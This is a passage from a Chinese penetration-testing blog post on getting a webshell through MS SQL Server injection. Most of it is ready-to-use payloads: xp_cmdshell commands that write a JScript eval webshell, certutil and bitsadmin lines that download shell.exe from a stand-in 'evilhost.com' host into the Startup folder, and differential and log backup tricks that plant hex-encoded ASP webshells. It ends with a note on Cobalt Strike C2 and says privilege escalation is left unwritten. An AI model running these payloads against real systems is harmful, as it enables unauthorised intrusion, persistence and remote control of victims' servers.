<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Aleen&gt;for /r c:\ %i in (1*.aspx) do @echo %i</span><br><span class="line">/*</span><br><span class="line">这是一个for循环命令，用于在指定目录及其子目录中遍历文件。</span><br><span class="line">%i：这是循环变量，用于存储每个匹配到的文件路径。</span><br><span class="line">(1*.aspx)：这是匹配文件名的模式。1*.aspx表示以1开头且以.aspx结尾的文件。</span><br><span class="line">do关键字后面的命令@echo %i用于打印匹配到的文件路径。</span><br><span class="line">%i表示当前循环的文件路径。</span><br><span class="line">*/</span><br><span class="line">e:\code\php\1.php</span><br><span class="line">C:\Users\Y4er&gt;</span><br></pre></td></tr></table></figure>

<p>所以我只需要建立一个表 存在一个char字段就可以了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1;CREATE TABLE cmdtmp (<span class="built_in">dir</span> varchar(8000));//创建一个名为cmdtmp的表。</span><br><span class="line">?<span class="built_in">id</span>=1;insert into cmdtmp(<span class="built_in">dir</span>) <span class="built_in">exec</span> master..xp_cmdshell <span class="string">&#x27;for /r c:\ %i in (1*.aspx) do @echo %i&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后通过注入去查询该表就可以了。</p>
<p>到这里的话我们就了解完了绝对路径的获取方法，那我们接下来该怎么拿shell呢</p>
<h5 id="1-2-xp-cmdshell拿shell"><a href="#1-2-xp-cmdshell拿shell" class="headerlink" title="1.2 xp_cmdshell拿shell"></a>1.2 xp_cmdshell拿shell</h5><p>上面已经讲到,xp_cmdshell可以用于执行Windows的cmd命令，那我们可以通过cmd 的echo命令来写入shell</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">?</span><span class="variable">id</span><span class="operator">=</span><span class="number">1</span><span class="operator">;</span><span class="variable">exec</span> <span class="variable">master</span><span class="operator">..</span><span class="type">xp_cmdshell</span> <span class="operator">&#x27;</span><span class="variable">echo</span> <span class="operator">^&lt;%@</span> <span class="variable">Page</span> <span class="built_in">Language</span><span class="operator">=</span><span class="string">&quot;Jscript&quot;</span><span class="operator">%^&gt;^&lt;%</span><span class="variable">eval</span><span class="punctuation">(</span><span class="variable">Request</span><span class="operator">.</span><span class="built_in">Item</span><span class="punctuation">[</span><span class="string">&quot;pass&quot;</span><span class="punctuation">]</span><span class="operator">,</span><span class="string">&quot;unsafe&quot;</span><span class="punctuation">)</span><span class="operator">;%^&gt;</span> <span class="operator">&gt;</span> <span class="variable">c</span><span class="operator">:</span>\\<span class="variable">WWW</span>\\<span class="number">404.</span><span class="variable">aspx</span><span class="operator">&#x27;</span> <span class="operator">;</span></span><br></pre></td></tr></table></figure>

<p>也可以通过下载文件去把我们的payload传入</p>
<p>下载文件通常有下面几种姿势</p>
<ol>
<li>certutil</li>
<li>vbs</li>
<li>bitsadmin</li>
<li>powershell</li>
<li>ftp</li>
</ol>
<p>这里介绍两种比较常用的</p>
<p>调用 certutil 下载文件</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &#x27;<span class="keyword">cd</span> C:UsersPublic &amp; certutil -urlcache -<span class="keyword">split</span> -f http:<span class="comment">//evilhost.com/download/shell.exe&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>调用 bitsadmin 下载文件并写入系统启动项</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master<span class="selector-class">.dbo</span><span class="selector-class">.xp_cmdshell</span> <span class="string">&#x27;bitsadmin /transfer n http://evilhost.com/image/shell.exe C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUpshell.exe&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="1-3-差异备份拿shell"><a href="#1-3-差异备份拿shell" class="headerlink" title="1.3 差异备份拿shell"></a>1.3 差异备份拿shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. backup database 库名 to disk = &#x27;c:\bak.bak&#x27;;--</span><br><span class="line"></span><br><span class="line">2. create table [dbo].[test] ([cmd] [image]);</span><br><span class="line"></span><br><span class="line">3. insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)</span><br><span class="line"></span><br><span class="line">4. backup database 库名 to disk=&#x27;C:\d.asp&#x27; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure>

<p>差异备份我们有多种情况可能不成功，一般就是目录权限的问题，第一次备份的目录是否可能没有权限，第二次备份到网站目录是否有权限，所以一般不要直接备份到c盘根目录</p>
<p>当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用前面提到的 定义局部变量来执行。</p>
<h5 id="1-4-log备份拿shell"><a href="#1-4-log备份拿shell" class="headerlink" title="1.4 log备份拿shell"></a>1.4 log备份拿shell</h5><p>LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">alter</span> <span class="keyword">database</span> 库名 <span class="keyword">set</span> RECOVERY <span class="keyword">FULL</span> </span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> <span class="keyword">create</span> <span class="keyword">table</span> cmd (a image) </span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> backup <span class="keyword">log</span> 库名 <span class="keyword">to</span> disk = <span class="string">&#x27;c:\xxx&#x27;</span> <span class="keyword">with</span> init </span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> <span class="keyword">insert</span> <span class="keyword">into</span> cmd (a) <span class="keyword">values</span> (<span class="number">0x3C25657865637574652872657175657374282261222929253E</span>) </span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> backup <span class="keyword">log</span> 库名 <span class="keyword">to</span> disk = <span class="string">&#x27;c:\xxx\2.asp&#x27;</span></span><br></pre></td></tr></table></figure>

<p>log备份的好处就是备份出来的webshell的文件大小非常的小</p>
<h4 id="2-提权getsystem"><a href="#2-提权getsystem" class="headerlink" title="2.提权getsystem"></a>2.提权getsystem</h4><p>我们继续来探究该怎么提权的问题</p>
<p>一般来说我们用xp_cmdshell去执行我们的payload后，通常会利用Cobalt Strike</p>
<p>Cobalt Strike是一款专业的渗透测试工具，一些Cobalt Strike的主要特点包括：</p>
<ol>
<li><strong>木马植入</strong>：Cobalt Strike提供了钓鱼攻击、恶意软件植入等功能，用于在目标系统上植入后门、远程访问工具等。</li>
<li><strong>漏洞利用模块</strong>：工具包含了各种漏洞利用模块，可用于利用目标系统中的漏洞。</li>
<li><strong>C2功能</strong>：Cobalt Strike具有C2（命令和控制）功能，允许攻击者与受感染的系统进行通信、控制和数据交换。</li>
</ol>
<p>提权没打过，确实写不动了，后面学了再回来补</p>

    </div>

    
    
    
	
	<div>
	  
		
<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

	  
	</div>


    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>wanTh3flag
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://wanth3f1ag.top/2025/05/21/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAsql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql/" title="深入浅出sql注入之mysql">https://wanth3f1ag.top/2025/05/21/深入浅出sql注入之mysql/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/MYSQL%E6%B3%A8%E5%85%A5/" rel="tag"># MYSQL注入</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/" rel="prev" title="filters-chain实现RCE">
                  <i class="fa fa-angle-left"></i> filters-chain实现RCE
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" rel="next" title="ctfshow入门SQL注入">
                  ctfshow入门SQL注入 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">3.3m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">50:05</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
